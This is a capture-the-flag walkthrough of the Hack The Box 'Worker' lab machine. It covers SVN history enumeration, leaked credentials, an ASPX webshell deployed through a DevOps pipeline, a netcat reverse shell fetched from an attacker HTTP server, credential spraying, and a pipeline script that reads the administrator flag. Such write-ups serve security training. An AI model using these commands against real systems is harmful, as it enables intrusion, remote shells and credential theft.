# [Worker](https://app.hackthebox.com/machines/worker)

```bash
nmap -p- --min-rate 10000 10.10.10.203 -Pn
```

![Alt text](img/image.png)


After discovering open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p80,3690,5985 10.10.10.203
```

![Alt text](img/image-1.png)


From port (3690), it means `SVN` open, let's enumerate this service.

What is SVN=> Subversion is used for maintaining current and historical versions of projects. Subversion is an open source centralized version control system. It's licensed under Apache. It's also referred to as a software version and revisioning control system. Default port: 3690.


```bash
svn checkout svn://10.10.10.203
```

![Alt text](img/image-2.png)


```bash
svn log
```

![Alt text](img/image-3.png)


Here, we can go back to **last commits**, via `-r` option,.

```bash
svn up -r1
```

![Alt text](img/image-4.png)


Let's go to second one.
```bash
svn up -r2
```

![Alt text](img/image-5.png)


Let's read this file `deploy.ps1` powershell script.

![Alt text](img/image-6.png)


From  here, we grab **sensitive credentials**.

nathen: wendel98


I add this ip address into '/etc/hosts' file as '**worker.htb**'


Let's do subdomain enumeration via `wfuzz`.

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.203 -H 'Host: FUZZ.worker.htb' --hh 703
```

![Alt text](img/image-7.png)


I add all subdomains into my '/etc/hosts' file.


Let's access devops.worker.htb by entering grabbed credentials.

![Alt text](img/image-8.png)

I take `alpha` one from here, as because I can access here from website (enumeration via `wfuzz` command)

![Alt text](img/image-9.png)


Our target application is here.

![Alt text](img/image-10.png)


From response headers, I see that is 'X-Powered-By: ASP.NET' , that's why I need to upload malicious `.aspx` file.



Let's create a branch and upload our webshell, then deployment.

1.Create a branch

![Alt text](img/image-11.png)


2.Upload a webshell.

![Alt text](img/image-12.png)

![Alt text](img/image-13.png)


3.Go to Pipelines for deployment.

![Alt text](img/image-14.png)


Final result is here.

![Alt text](img/image-15.png)

![Alt text](img/image-16.png)


Let's add reverse shell here.

1.First, open http server to serve `nc` binary.
```bash
python3 -m http.server --bind 10.10.16.6 8080
```


![Alt text](img/image-18.png)

2.Then, run a below command on webshell to download `nc` binary.
```bash
powershell -c wget 10.10.16.6:8080/nc.exe -outfile \programdata\nc.exe
```

![Alt text](img/image-17.png)


3.Then, write your reverse shell command.
```bash
\programdata\nc.exe -e cmd.exe 10.10.16.6 1337
```

![Alt text](img/image-19.png)


I got reverse shell from port (1337).

![Alt text](img/image-20.png)


I cannot find anything from C: disk, let's know another disks via below command.
```bash
wmic logicaldisk get deviceid, volumename, description
```

And I switched into 'W:' disk.

![Alt text](img/image-21.png)


I find sensitive usernames and passwords credentials for a file 'passwd' on 'svnrepos/www/conf' directory.

![Alt text](img/image-22.png)


users:
```bash
cat creds.txt | cut -d '=' -f1 > users
```
passwords:
```bash
cat creds.txt | cut -d '=' -f2 | sed 's/[[:space:]]*//g' > passwords
```


Let's do enumeration for this credentials via `crackmapexec` tool.
```bash
crackmapexec winrm 10.10.10.203 -u users -p passwords -d 'worker.htb' --no-bruteforce
```

![Alt text](img/image-23.png)


worker.htb\robisl:wolves11 


Let's connect into machine via `evil-winrm` tool by using grabbed credentials.

```bash
evil-winrm -i 10.10.10.203 -u robisl -p wolves11
```


user.txt

![Alt text](img/image-24.png)


Also, we can join into `devops.worker.htb` via grabbed credentials previously. (robisl:wolves11)

Here, we have 'PartsUnlimited' repository.

![Alt text](img/image-25.png)



We have a privilege to create pipeline and I add malicious scripts into pipeline.

1.Pipelines -> Create a pipeline

2.Select repo.

3.Select starter pipeline

![Alt text](img/image-26.png)


```yaml
trigger:
- master

pool: 'Setup'

steps:
- script: |
    whoami
    type c:\users\administrator\desktop\root.txt
  displayName: 'Pwn all the things'
```

![Alt text](img/image-27.png)


![Alt text](img/image-28.png)


Reminder! You can also change script part with your reverse shell command

Reminder! Don't forget to approve to see results.


root.txt


![Alt text](img/image-29.png)